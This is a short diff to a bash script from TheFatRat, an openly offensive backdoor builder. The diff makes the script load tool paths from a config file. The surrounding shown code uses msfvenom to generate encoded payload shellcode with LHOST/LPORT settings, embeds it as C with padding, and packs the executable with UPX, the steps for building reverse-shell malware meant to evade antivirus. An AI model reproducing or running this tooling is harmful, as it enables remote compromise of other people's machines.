@@ -1,5 +1,15 @@
 #!/bin/bash
-
+file="config.path"
+if [ -f "$file" ]
+then
+msfconsole=`sed -n 4p config.path`	
+msfvenom=`sed -n 5p config.path`
+backdoor=`sed -n 6p config.path`
+searchsploit=`sed -n 7p config.path`
+else
+	echo "$file does not exists , run setup.sh first ."
+exit 1
+fi
 
 ###################################################################################################
 # FatRat Coded By Screetsec ( Edo Maland )
@@ -186,7 +196,7 @@ while [[ ! -f "$outputExe" ]]; do
     generatePadding
   
     echo "" >> $cProg
-    msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
+    $msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
 
     generatePadding
 
@@ -210,5 +220,3 @@ done
 
 # Use UPX to create a second executable, testing...
 upx -q --ultra-brute -o $outputUPX $outputExe
-
-
